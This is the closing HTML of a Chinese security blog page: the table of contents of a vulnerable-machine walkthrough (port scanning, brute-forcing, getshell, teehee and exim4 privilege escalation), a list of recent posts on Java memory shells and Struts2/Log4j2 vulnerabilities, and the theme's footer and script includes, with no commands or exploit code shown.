href="#%E5%AF%BB%E6%89%BE%E9%9D%B6%E6%9C%BA%E7%9C%9F%E5%AE%9EIP"><span class="toc-number">3.1.</span> <span class="toc-text">寻找靶机真实IP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E6%9C%8D%E5%8A%A1%E4%BB%A5%E5%8F%8A%E7%AB%AF%E5%8F%A3"><span class="toc-number">3.2.</span> <span class="toc-text">探测服务以及端口</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E6%9C%80%E7%BB%88flag"><span class="toc-number">4.</span> <span class="toc-text">寻找最终flag</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81"><span class="toc-number">4.1.</span> <span class="toc-text">爆破账户密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cgetshell"><span class="toc-number">4.2.</span> <span class="toc-text">命令执行getshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux%E6%8F%90%E6%9D%83"><span class="toc-number">4.3.</span> <span class="toc-text">Linux提权</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#hydra%E7%88%86%E7%A0%B4ssh%E5%AF%86%E7%A0%81"><span class="toc-number">4.3.1.</span> <span class="toc-text">hydra爆破ssh密码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ssh%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5"><span class="toc-number">4.3.2.</span> <span class="toc-text">ssh远程连接</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#teehee%E6%8F%90%E6%9D%83"><span class="toc-number">4.3.3.</span> <span class="toc-text">teehee提权</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exim4%E6%8F%90%E6%9D%83"><span class="toc-number">4.4.</span> <span class="toc-text">exim4提权</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/08/19/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Listener%E5%86%85%E5%AD%98%E9%A9%AC/" title="java内存马连续剧——Listener内存马"><img src="/img/art03.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java内存马连续剧——Listener内存马"/></a><div class="content"><a class="title" href="/2023/08/19/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Listener%E5%86%85%E5%AD%98%E9%A9%AC/" title="java内存马连续剧——Listener内存马">java内存马连续剧——Listener内存马</a><time datetime="2023-08-19T08:46:50.000Z" title="发表于 2023-08-19 16:46:50">2023-08-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/16/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Filter%E5%86%85%E5%AD%98%E9%A9%AC/" title="java内存马连续剧——Filter内存马"><img src="/img/art03.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java内存马连续剧——Filter内存马"/></a><div class="content"><a class="title" href="/2023/08/16/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Filter%E5%86%85%E5%AD%98%E9%A9%AC/" title="java内存马连续剧——Filter内存马">java内存马连续剧——Filter内存马</a><time datetime="2023-08-16T15:14:13.000Z" title="发表于 2023-08-16 23:14:13">2023-08-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/15/Evilbox%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/" title="Evilbox打靶记录"><img src="/img/art/a7.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Evilbox打靶记录"/></a><div class="content"><a class="title" href="/2023/08/15/Evilbox%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/" title="Evilbox打靶记录">Evilbox打靶记录</a><time datetime="2023-08-15T10:18:04.000Z" title="发表于 2023-08-15 18:18:04">2023-08-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/13/Struts2-S2-001%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="Struts2-S2-001漏洞复现"><img src="/img/art/a4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Struts2-S2-001漏洞复现"/></a><div class="content"><a class="title" href="/2023/08/13/Struts2-S2-001%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="Struts2-S2-001漏洞复现">Struts2-S2-001漏洞复现</a><time datetime="2023-08-13T02:16:21.000Z" title="发表于 2023-08-13 10:16:21">2023-08-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/01/Log4j2-JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2021-44228/" title="Log4j2 JNDI注入漏洞(CVE-2021-44228)"><img src="/img/art03.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Log4j2 JNDI注入漏洞(CVE-2021-44228)"/></a><div class="content"><a class="title" href="/2023/08/01/Log4j2-JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2021-44228/" title="Log4j2 JNDI注入漏洞(CVE-2021-44228)">Log4j2 JNDI注入漏洞(CVE-2021-44228)</a><time datetime="2023-08-01T07:50:03.000Z" title="发表于 2023-08-01 15:50:03">2023-08-01</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/art/a7.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By XiLitter</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></body></html>
